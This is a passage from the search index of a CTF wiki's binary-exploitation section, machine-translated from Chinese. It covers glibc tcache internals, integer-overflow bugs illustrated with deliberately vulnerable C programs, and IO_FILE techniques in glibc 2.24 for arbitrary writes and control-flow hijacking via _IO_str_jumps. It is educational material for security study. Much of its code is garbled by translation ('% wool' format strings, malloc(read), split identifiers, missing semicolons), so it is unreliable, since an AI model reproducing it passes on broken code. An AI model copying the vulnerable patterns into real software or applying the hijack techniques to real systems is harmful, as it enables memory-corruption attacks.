DIAG_POP_NEEDS_COMMENT;\n\n#endif\n    ......\n\n    ......\n\n}\n</code></pre>"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#__tcache_init","title":"__tcache_init ()","text":"<p>Where <code>MAYBE_INIT_TCACHE ()</code> calls <code>tcache_init()</code> when tcache is empty (that is, the first malloc), and directly looks at <code>tcache_init()</code></p> <p>source code</p> <pre><code>tcache_init(void)\n\n{\n\nmstate ar_ptr;\n  void *victim = 0;\n\n  const size_t bytes = sizeof (tcache_perthread_struct);\n\n  if (tcache_shutting_down)\n\n    return;\n\nArena_get (ar_ptr, bytes); // find available arena\nVictim = _int_malloc (ar_ptr, bytes); // Request a chunk of sizeof(tcache_prethread_struct) size  if (!victim &amp;&amp; ar_ptr != NULL)\n\n    {\n\n      ar_ptr = arena_get_retry (ar_ptr, bytes);\n\n      victim = _int_malloc (ar_ptr, bytes);\n\n    }\n\n  if (ar_ptr != NULL)\n\n    __libc_lock_unlock (ar_ptr-&gt;mutex);\n\n  /* In a low memory situation, we may not be able to allocate memory\n\n     - in which case, we just keep trying later.  However, we\n\n     typically do this very early, so either there is sufficient\n\n     memory, or there isn't enough memory to do non-trivial\n\n     allocations anyway.  */\n\nIf (victim) // initialize tcache\n    {\n\n      tcache = (tcache_perthread_struct *) victim;\n\n      memset (tcache, 0, sizeof (tcache_perthread_struct));\n\n    }\n\n}\n</code></pre> <p><code>tcache_init()</code> After successful return, <code>tcache_prethread_struct</code> was successfully created.</p>"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#applying-for-memory","title":"Applying for memory","text":"<p>Next, you will enter the steps to apply for memory. <pre><code>// Get memory from tcache list\nIf (tc_idx &amp;lt; mp_.tcache_bins // idx calculated by size is within legal range\n      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */\n\n      &amp;&amp; tcache\n\n&amp;amp;&amp;amp; tcache-&amp;gt;entries[tc_idx] != NULL) // The tcache chain is not empty\n    {\n\n      return tcache_get (tc_idx);\n\n    }\n\n  DIAG_POP_NEEDS_COMMENT;\n\n#endif\n// Enter a process similar to when there is no tcache\n  if (SINGLE_THREAD_P)\n\n    {\n\n      victim = _int_malloc (&amp;main_arena, bytes);\n\n      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||\n\n              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));\n\n      return victim;\n\n    }\n</code></pre></p> <p>When <code>tcache-&amp;gt;entries</code> is not empty, it will enter the process of <code>tcache_get()</code> to get the chunk. Otherwise, it is similar to the process before the tcache mechanism. Here, the first type of <code>tcache_get()</code> is analyzed. It can also be seen here that tcache has a high priority and is higher than fastbin (the application of fastbin is not in the process of entering tcache).</p>"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#tcache_get","title":"tcache_get()","text":"<p>Take a look at <code>tcache_get()</code></p> <p>source code</p> <pre><code>/* Caller must ensure that we know tc_idx is valid and there's\n\n   available chunks to remove.  */\n\nstatic __always_inline void *\n\ntcache_get (size_t tc_idx)\n\n{\n\n  tcache_entry *e = tcache-&gt;entries[tc_idx];\n\n  assert (tc_idx &lt; TCACHE_MAX_BINS);\n\n  assert (tcache-&gt;entries[tc_idx] &gt; 0);\n\n  tcache-&gt;entries[tc_idx] = e-&gt;next;\n\n--(tcache-&amp;gt;counts[tc_idx]); // Get a chunk, counts one less\n  return (void *) e;\n\n}\n</code></pre> <p><code>tcache_get()</code> is the process of getting the chunk. It can be seen that this process is still very simple. Get the first chunk from <code>tcache-&amp;gt;entries[tc_idx]</code>, decrement one by <code>tcache-&amp;gt;counts</code>, and there is almost no protection.</p>"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#__libc_free","title":"__libc_free()","text":"<p>After reading the application, look at the release when there is tcache</p> <p>source code</p> <pre><code>void\n\n__libc_free (void *mem)\n\n{\n\n  ......\n\n  ......\n\n  MAYBE_INIT_TCACHE ();\n\n  ar_ptr = arena_for_chunk (p);\n\n  _int_free (ar_ptr, p, 0);\n\n}\n</code></pre> <p><code>__libc_free()</code> doesn't change much, <code>MAYBE_INIT_TCACHE ()</code> has no effect on tcache not empty.</p>"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#_int_free","title":"_int_free()","text":"<p>Follow up <code>_int_free()</code></p> <p>source code</p> <pre><code>static void\n\n_int_free (mstate av, mchunkptr p, int have_lock)\n\n{\n\n  ......\n\n  ......\n\n#if USE_TCACHE\n\n  {\n\n    size_t tc_idx = csize2tidx (size);\n\n    if (tcache\n\n        &amp;&amp; tc_idx &lt; mp_.tcache_bins // 64\n\n        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) // 7\n\n      {\n\n        tcache_put (p, tc_idx);\n\n        return;\n\n      }\n\n  }\n\n#endif\n  ......\n\n  ......\n</code></pre> <p>When judging <code>tc_idx</code> is legal, <code>tcache-&amp;gt;counts[tc_idx]</code> is within 7, it enters <code>tcache_put()</code>, the two parameters passed are the chunk to be released and the size corresponding to the chunk in tcache. Standard.</p>"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#tcache_put","title":"tcache_put()","text":"<p>source code</p> <pre><code>/* Caller must ensure that we know tc_idx is valid and there's room\n\n   for more chunks.  */\n\nstatic __always_inline void\n\ntcache_put (mchunkptr chunk, size_t tc_idx)\n\n{\n\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n\n  assert (tc_idx &lt; TCACHE_MAX_BINS);\n\n  e-&gt;next = tcache-&gt;entries[tc_idx];\n\n  tcache-&gt;entries[tc_idx] = e;\n\n  ++(tcache-&gt;counts[tc_idx]);\n}\n</code></pre> <p><code>tcache_puts()</code> completes the operation of inserting the released chunk into the <code>tcache-&amp;gt;entries[tc_idx]</code> list header with almost no protection. And ** did not set the p position to zero**.</p>"},{"location":"pwn/linux/glibc-heap/implementation/tcache/#reference","title":"Reference","text":"<ul> <li> <p>http://tukan.farm/2017/07/08/tcache/</p> </li> <li> <p>https://github.com/bash-c/slides/blob/master/pwn_heap/tcache_exploitation.pdf</p> </li> <li> <p>https://www.secpulse.com/archives/71958.html</p> </li> </ul>"},{"location":"pwn/linux/integeroverflow/intof/","title":"integer overflow","text":""},{"location":"pwn/linux/integeroverflow/intof/#introduction","title":"Introduction","text":"<p>In C language, the basic data types of integers are divided into short (short), integer (int), and long (long). These three data types are also divided into signed and unsigned, each data type. They all have their own size ranges (because the size range of the data type is determined by the compiler, so the default is to use gcc-5.4 under 64 bits), as shown below:</p> Type Byte Range <p>| short int | 2byte(word) | 0~32767(0~0x7fff)  -32768~-1(0x8000~0xffff)  |</p> <p>| unsigned short int | 2byte(word) | 0~65535(0~0xffff) |</p> <p>| int | 4byte(dword) | 0~2147483647(0~0x7fffffff)  -2147483648~-1(0x80000000~0xffffffff) |</p> <p>| unsigned int | 4byte(dword) | 0~4294967295(0~0xffffffff) |</p> <p>| long int | 8byte(qword) | \u6b63: 0~0x7fffffffffffffff  Negative: 0x8000000000000000~0xffffffffffffffff | | unsigned long int | 8byte(qword) | 0~0xffffffffffffffff |</p> <p>When the data in the program exceeds the range of its data type, it will cause an overflow, and the overflow of the integer type is called integer overflow.</p>"},{"location":"pwn/linux/integeroverflow/intof/#principle","title":"Principle","text":"<p>Next, the principle of integer overflow is briefly explained.</p>"},{"location":"pwn/linux/integeroverflow/intof/#upper-bound-overflow","title":"Upper bound overflow","text":"<pre><code># Fake code\nshort int a;\n\n\n\na = a + 1;\n\n# corresponding assembly\nmovzx eax, word ptr [rbp - 0x1c]\nadd    eax, 1\n\nmov word ptr [rbp - 0x1c], ax\n\n\nunsigned short int b;\n\n\n\nb = b + 1;\n\n# assembly code\n\nadd    word ptr [rbp - 0x1a], 1\n</code></pre> <p>There are two cases of upper bound overflow, one is <code>0x7fff + 1</code> and the other is <code>0xffff + 1</code>.</p> <p>Because the underlying instructions of the computer are not distinguishable between signed and unsigned, the data exists in binary form (the compiler level distinguishes between signed and unsigned, resulting in different assembly instructions).</p> <p>So <code>add 0x7fff, 1 == 0x8000</code>, this upper bound overflow has no effect on unsigned integers, but in signed short integers, <code>0x7fff</code> means <code>32767</code>, but <code>0x8000</code> It is <code>-32768</code>, which is represented by a mathematical expression in the signed short integer <code>32767+1 == -32768</code>.</p> <p>The second case is <code>add 0xffff, 1</code>. In this case, the first operand is considered.</p> <p>For example, the assembly code for the signed addition above is <code>add eax, 1</code>, because <code>eax=0xffff</code>, so <code>add eax, 1 == 0x10000</code>, but the unsigned assembly code is to add the memory <code>add Word ptr [rbp - 0x1a], 1 == 0x0000</code>.</p> <p>In the signed addition, although the result of <code>eax</code> is 0x10000, only the value of <code>ax=0x0000</code> is stored in the memory, and the result is the same as the unsigned.</p> <p>Look at the result of this overflow from the digital level. In the signed short integer, <code>0xffff==-1, -1 + 1 == 0</code>, this calculation is no problem from a signed one.</p> <p>But in an unsigned short, <code>0xffff == 65535, 65535 + 1 == 0</code>.</p>"},{"location":"pwn/linux/integeroverflow/intof/#_1","title":"\u4e0b\u754c\u6ea2","text":"<p>The next overflow is the same as the upper bound overflow. In the assembly code, just replace <code>add</code> with <code>sub</code>.</p> <p>There are two cases as well:</p> <p>The first is <code>sub 0x0000, 1 == 0xffff</code>, which is ok for signed <code>0 - 1 == -1</code>, but for unsigned it becomes <code>0 - 1 == 65535</code>.</p> <p>The second is <code>sub 0x8000, 1 == 0x7fff</code>, for unsigned it is <code>32768 - 1 == 32767</code> is correct, but for signed it becomes <code>-32768 - 1 = 32767</code> .</p>"},{"location":"pwn/linux/integeroverflow/intof/#example","title":"example","text":"<p>In the vulnerability of the integer overflow I have seen, I think it can be summarized in two cases.</p>"},{"location":"pwn/linux/integeroverflow/intof/#unrestricted-range","title":"Unrestricted range","text":"<p>This situation is well understood. For example, if you have a fixed-size bucket, pour water into it. If you don't limit how much water is poured, the water will overflow from the bucket.</p> <p>A thing of a fixed size, you do not constrain it, can have unpredictable consequences.</p> <p>Simply write an example:</p> <pre><code>$ cat test.c\n\n#include&lt;stddef.h&gt;\n\nint main(void)\n\n{\n\nint len;\nint data_len;\nint header_len;\n    char *buf;\n\n\n\nheader_len = 0x10;\nscanf (&amp;quot;% wool&amp;quot;, &amp;amp; data_len);\n\n\nlen = data_len + header_len\nbuf = malloc (read);\n    read(0, buf, data_len);\n\n    return 0;\n\n}\n\n$ gcc test.c\n\n$ ./a.out\n\n-1\n\nasdfasfasdfasdfafasfasfasdfasdf\n\n# gdb a.out\n\n\u25ba 0x40066d &lt;main+71&gt;    call   malloc@plt &lt;0x400500&gt;\n\n        size: 0xf\n</code></pre> <p>Only apply <code>0x20</code> size heap, but can input <code>0xffffffff</code> length data, from integer overflow to heap overflow</p>"},{"location":"pwn/linux/integeroverflow/intof/#wrong-type-conversion","title":"Wrong type conversion","text":"<p>Even if the correct constraints on the variables, there is still the possibility of integer overflow vulnerabilities, I think can be summarized as the wrong type conversion, if you continue to subdivide, you can be divided into:</p> <ol> <li>A large range of variables is assigned to a small range of variables</li> </ol> <pre><code>$ cat test2.c\nvoid check(int n)\n\n{\n\n    if (!n)\n\n        printf(\"vuln\");\n\n    else\n\n        printf(\"OK\");\n\n}\n\n\nint main(void)\n\n{\n\n    long int a;\n\n\n\n    scanf(\"%ld\", &amp;a);\n\n    if (a == 0)\n\n        printf(\"Bad\");\n\n    else\n\n        check(a);\n\n    return 0;\n\n}\n\n$ gcc test2.c\n\n$ ./a.out\n\n4294967296\n\nvuln\n</code></pre> <p>The above code is a large variable (long integer a), which is a variable with a small range (integer variable n) after passing the check function, causing an integer overflow.</p> <p>The long integer has 8 bytes of memory space, while the integer has only 4 bytes of memory space, so when long -&gt; int, it will cause truncation, and only the low 4 bytes of the long integer will be passed to the integer variable.</p> <p>In the above example, put <code>long: 0x100000000 -&amp;gt; int: 0x00000000</code>.</p> <p>But when a smaller variable can completely pass the value to a larger variable without causing data loss.</p> <ol> <li>Only unilateral restrictions</li> </ol> <p>This case is only for signed types</p> <pre><code>$ cat test3.c\n\nint main(void)\n\n{\n\nint len, l;\n    char buf[11];\n\n\n\nscanf (&amp;quot;% d&amp;quot;, &amp;amp; len);\nif (len &amp;lt;10) {\n        l = read(0, buf, len);\n\n        *(buf+l) = 0;\n\n        puts(buf);\n\n    } else\n\n        printf(\"Please len &lt; 10\");        \n\n}\n\n$ gcc test3.c\n\n$ ./a.out\n\n-1\n\naaaaaaaaaaaa\naaaaaaaaaaaa\n</code></pre> <p>On the surface, we have limited the variable len, but if you think about it, you can see that len is a signed integer, so the length of len can be negative, but in the read function, the type of the third parameter is <code>size_t</code> , the type is equivalent to <code>unsigned long int</code>, which is an unsigned long integer</p> <p>The two cases in the above example have a commonality, that is, the formal parameters of the function and the types of the actual parameters are different, so I think it can be summarized as the wrong type conversion.</p>"},{"location":"pwn/linux/integeroverflow/intof/#ctf-example","title":"CTF example","text":"<p>Title: [Pwnhub Story's Beginning Cal] (http://atum.li/2016/12/05/calc/)</p>"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/","title":"glibc 2.24 Utilization of IO_FILE","text":""},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#introduction","title":"Introduction","text":"<p>In the 2.24 version of glibc, the new detection of vtable hijacking for IO_FILE_plus, glibc The validity of the vtable address is checked first before calling the virtual function. First, it will verify whether the vtable is in the _IO_vtable section. If the condition is met, it will be executed normally. Otherwise, _IO_vtable_check will be called for further checking.</p> <pre><code>/* Check if unknown vtable pointers are permitted; otherwise,\n\n   terminate the process.  */\n\nvoid _IO_vtable_check (void) attribute_hidden;\n\n/* Perform vtable pointer validation.  If validation fails, terminate\n\n   the process.  */\n\nstatic inline const struct _IO_jump_t *\n\nIO_validate_vtable (const struct _IO_jump_t *vtable)\n\n{\n\n  /* Fast path: The vtable pointer is within the __libc_IO_vtables\n\n     section.  */\n\n  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;\n\nuintptr_t ptr = (uintptr_t) vtable;\n  uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;\n\n  if (__glibc_unlikely (offset &gt;= section_length))\n\n    /* The vtable pointer is not in the expected section.  Use the\n\n       slow path, which will terminate the process if necessary.  */\n\n_IO_vtable_check ();\n  return vtable;\n\n}\n</code></pre> <p>Calculate <code>section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</code>, and then determine the offset of vtable - __start___libc_IO_vtables. If the offset is greater than section_length, ie greater than <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> then the <code>_IO_vtable_check()</code> function will be called.</p> <pre><code>void attribute_hidden\n\n_IO_vtable_check (void)\n\n{\n\n#ifdef SHARED\n\n  /* Honor the compatibility flag.  */\n\n  void (*flag) (void) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);\n\n#ifdef PTR_DEMANGLE\nPTR_DEMANGLE (flag);\n#endif\n  if (flag == &amp;_IO_vtable_check)\n\n    return;\n\n\n\n  /* In case this libc copy is in a non-default namespace, we always\n\n     need to accept foreign vtables because there is always a\n\n     possibility that FILE * objects are passed across the linking\n\n     boundary.  */\n\n  {\n\nDl_info di;\n    struct link_map *l;\n\n    if (_dl_open_hook != NULL\n\n|| (_dl_addr (_IO_vtable_check, &amp;amp; di, &amp;amp; l, NULL)! = 0\n            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))\n\n      return;\n\n  }\n\n\n\n#else /* !SHARED */\n\n  /* We cannot perform vtable validation in the static dlopen case\n\n     because FILE * handles might be passed back and forth across the\n\n     boundary.  Therefore, we disable checking in this case.  */\n\n  if (__dlopen != NULL)\n\n    return;\n\n#endif\n\n\n  __libc_fatal (\"Fatal error: glibc detected an invalid stdio handle\\n\");\n\n}\n</code></pre> <p>If the vtable is illegal, then abort is raised.</p> <p>The check here makes it difficult to implement the technology that used vtable in the past.</p>"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#new-utilization-technology","title":"New utilization technology","text":""},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#fileno-use-of-buffers","title":"fileno Use of buffers","text":"<p>After the vtable is difficult to exploit, the focus of interest is transferred from the vtable to the domain inside the _IO_FILE structure. As mentioned earlier, _IO_FILE is created and responsible for maintaining some related information when using the standard IO library. Some of the fields are used to write addresses or read addresses when calling functions such as fwrite and fread. If you can control these data, Any address write or arbitrary address read can be implemented.</p> <pre><code>struct _IO_FILE {\n  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */\n\n  /* The following pointers correspond to the C++ streambuf protocol. */\n\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n\n  char* _IO_read_ptr;   /* Current read pointer */\n\n  char* _IO_read_end;   /* End of get area. */\n\n  char* _IO_read_base;  /* Start of putback+get area. */\n\n  char* _IO_write_base; /* Start of put area. */\n\n  char* _IO_write_ptr;  /* Current put pointer. */\n\n  char* _IO_write_end;  /* End of put area. */\n\n  char* _IO_buf_base;   /* Start of reserve area. */\n\n  char* _IO_buf_end;    /* End of reserve area. */\n\n  /* The following fields are used to support backing up and undo. */\n\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n\n\n  struct _IO_marker *_markers;\n\n\n\n  struct _IO_FILE *_chain;\n\n\n\n  int _fileno;\n\n  int _flags2;\n\n  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */\n\n};\n</code></pre> <p>Because the process contains the system default three file streams stdin\\stdout\\stderr, this method can not use the file operation in the process, and can be used by scanf\\printf.</p> <p>In _IO_FILE, _IO_buf_base indicates the start address of the operation, and _IO_buf_end indicates the end address. By controlling these two data, the operation of controlling read and write can be realized.</p>"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#example","title":"Example","text":"<p>Simply observe the effect of _IO_FILE on calling scanf</p> <pre><code>#include \"stdio.h\"\n\n\n\nchar buf[100];\n\n\n\nint main()\n{\n\n char stack_buf[100];\n\n scanf(\"%s\",stack_buf);\n\n scanf(\"%s\",stack_buf);\n\n\n\n}\n</code></pre> <p>The content of stdin has not been initialized until the first time the executable is used.</p> <pre><code>0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2088  0x0000000000000000\n\n0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff\n\n0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790\n\n0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000\n\n0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000\n\n0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0 &lt;== vtable\n</code></pre> <p>After calling scanf, you can see that the fields _IO_read_ptr, _IO_read_base, _IO_read_end, _IO_buf_base, _IO_buf_end are initialized.</p> <pre><code>0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2288  0x0000000000602013\n\n0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000602014  0x0000000000602010\n\n0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000602010  0x0000000000602010\n\n0x7ffff7dd1910 &lt;_IO_2_1_stdin_+48&gt;: 0x0000000000602010  0x0000000000602010\n\n0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x0000000000602410  0x0000000000000000\n\n0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff\n\n0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790\n\n0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000\n\n0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000\n\n0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff  0x0000000000000000\n\n0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0\n</code></pre> <p>Further thinking can be found that the memory initialized by stdin is actually allocated on the heap. The base address of the heap here is 0x602000, because there is no heap allocation before, so the address of the buffer is also 0x602010.</p> <pre><code>Start              End                Offset             Perm Path\n\n0x0000000000400000 0x0000000000401000 0x0000000000000000 rx /home/vb/desktop/tst/1/t1\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/desktop/tst/1/t1\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/desktop/tst/1/t1\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n</code></pre> <p>The allocated heap size is 0x400 bytes, which corresponds to _IO_buf_base~_IO_buf_end After writing, you can see that we have written data in the buffer, and then the buffer in the destination address stack will also write data.</p> <pre><code>0x602000: 0x0000000000000000 0x0000000000000411 &amp;lt;== allocate 0x400 size\n0x602010: 0x000000000a333231 0x0000000000000000 &amp;lt;== buffering data\n0x602020:   0x0000000000000000  0x0000000000000000\n\n0x602030:   0x0000000000000000  0x0000000000000000\n\n0x602040:   0x0000000000000000  0x0000000000000000\n</code></pre> <p>Next we try to modify _IO_buf_base to achieve arbitrary address reading and writing, the address of the global buffer buf is 0x7ffff7dd2740. Modify _IO_buf_base and _IO_buf_end to the address of buffer buf</p> <pre><code>0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;:    0x00000000fbad2288  0x0000000000602013\n\n0x7ffff7dd18f0 &lt;_IO_2_1_stdin_+16&gt;: 0x0000000000602014  0x0000000000602010\n\n0x7ffff7dd1900 &lt;_IO_2_1_stdin_+32&gt;: 0x0000000000602010  0x0000000000602010\n\n0x7ffff7dd1910 &amp;lt;_IO_2_1_stdin_ + 48&amp;gt;: 0x0000000000602010 0x00007ffff7dd2740 &amp;lt;== _IO_buf_base\n0x7ffff7dd1920 &lt;_IO_2_1_stdin_+64&gt;: 0x00007ffff7dd27c0  0x0000000000000000 &lt;== _IO_buf_end\n\n0x7ffff7dd1930 &lt;_IO_2_1_stdin_+80&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1940 &lt;_IO_2_1_stdin_+96&gt;: 0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd1950 &lt;_IO_2_1_stdin_+112&gt;:    0x0000000000000000  0xffffffffffffffff\n\n0x7ffff7dd1960 &lt;_IO_2_1_stdin_+128&gt;:    0x0000000000000000  0x00007ffff7dd3790\n\n0x7ffff7dd1970 &lt;_IO_2_1_stdin_+144&gt;:    0xffffffffffffffff  0x0000000000000000\n\n0x7ffff7dd1980 &lt;_IO_2_1_stdin_+160&gt;:    0x00007ffff7dd19c0  0x0000000000000000\n\n0x7ffff7dd1990 &lt;_IO_2_1_stdin_+176&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd19a0 &lt;_IO_2_1_stdin_+192&gt;:    0x00000000ffffffff  0x0000000000000000\n\n0x7ffff7dd19b0 &lt;_IO_2_1_stdin_+208&gt;:    0x0000000000000000  0x00007ffff7dd06e0\n</code></pre> <p>After that, the read data of scanf will be written to the location of 0x7ffff7dd2740.</p> <pre><code>0x7ffff7dd2740 &lt;buf&gt;:   0x00000a6161616161  0x0000000000000000\n\n0x7ffff7dd2750 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd2760 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd2770 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000\n\n0x7ffff7dd2780 &lt;buffer&gt;:    0x0000000000000000  0x0000000000000000\n</code></pre>"},{"location":"pwn/linux/io_file/exploit-in-libc2.24/#_io_str_jumps-overflow","title":"_IO_str_jumps -&gt; overflow","text":"<p><code>libc</code> is not only <code>_IO_file_jumps</code> such a <code>vtable</code>, but also a <code>_IO_str_jumps</code>, this <code>vtable</code> is not in the check range.</p> <pre><code>const struct _IO_jump_t _IO_str_jumps libio_vtable =\n\n{\n\n  JUMP_INIT_DUMMY,\n\n  JUMP_INIT(finish, _IO_str_finish),\n\n  JUMP_INIT(overflow, _IO_str_overflow),\n\n  JUMP_INIT(underflow, _IO_str_underflow),\n\n  JUMP_INIT(uflow, _IO_default_uflow),\n\n  JUMP_INIT(pbackfail, _IO_str_pbackfail),\n\n  JUMP_INIT(xsputn, _IO_default_xsputn),\n\n  JUMP_INIT(xsgetn, _IO_default_xsgetn),\n\n  JUMP_INIT(seekoff, _IO_str_seekoff),\n\n  JUMP_INIT(seekpos, _IO_default_seekpos),\n\n  JUMP_INIT(setbuf, _IO_default_setbuf),\n\n  JUMP_INIT(sync, _IO_default_sync),\n\n  JUMP_INIT(doallocate, _IO_default_doallocate),\n\n  JUMP_INIT(read, _IO_default_read),\n\n  JUMP_INIT(write, _IO_default_write),\n\n  JUMP_INIT(seek, _IO_default_seek),\n\n  JUMP_INIT(close, _IO_default_close),\n\n  JUMP_INIT(stat, _IO_default_stat),\n\n  JUMP_INIT(showmanyc, _IO_default_showmanyc),\n\n  JUMP_INIT(imbue, _IO_default_imbue)\n\n};\n</code></pre> <p>If we can set the <code>vtable</code> of the file pointer to <code>_IO_str_jumps</code>, we can call a different file manipulation function. Here is an example of <code>_IO_str_overflow</code>:</p> <pre><code>int\n\n_IO_str_overflow (_IO_FILE *fp, int c)\n\n{\n\n  int flush_only = c == EOF;\n\n  _IO_size_t pos;\n\n  if (fp-&gt;_flags &amp; _IO_NO_WRITES)// pass\n\n      return flush_only ? 0 : EOF;\n\n  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))\n\n    {\n\n      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;\n\n      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;\n\n      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;\n\n    }\n\n  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;\n\n  if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))// should in \n\n    {\n\n      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */ // pass\n\n    return EOF;\n\n      else\n\n    {\n\n      char *new_buf;\n\n      char *old_buf = fp-&gt;_IO_buf_base;\n\nsize_t old_blen = _IO_blen (fp);\n      _IO_size_t new_size = 2 * old_blen + 100;\n\nIf (new_size &amp;lt; old_blen)//pass will generally pass\n        return EOF;\n\n      new_buf\n\n        = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);//target [fp+0xe0]\n\n      if (new_buf == NULL)\n\n        {\n\n          /*      __ferror(fp) = 1; */\n\n          return EOF;\n\n        }\n\n      if (old_buf)\n\n        {\n\n          memcpy (new_buf, old_buf, old_blen);\n\n          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);\n\n          /* Make sure _IO_setb won't try to delete _IO_buf_base. */\n\nfp -&amp;gt; _ IO_buf_base = NULL;\n        }\n\n      memset (new_buf + old_blen, '\\0', new_size - old_blen);\n\n\n\n      _IO_setb (fp, new_buf, new_buf + new_size, 1);\n\n      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);\n\n      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);\n\n      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);\n\n      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);\n\n\n\n      fp-&gt;_IO_write_base = new_buf;\n\n      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;\n\n    }\n\n    }\n\n\n\n  if (!flush_only)\n\n    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;\n\n  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)\n\n    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;\n\n  return c;\n\n}\n\nlibc_hidden_def (_IO_str_overflow)\n</code></pre> <p>Use the following code to hijack the program flow</p> <pre><code>      new_buf\n\n        = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);\n</code></pre> <p>Several conditions bypass:</p> <ol> <li>`1. 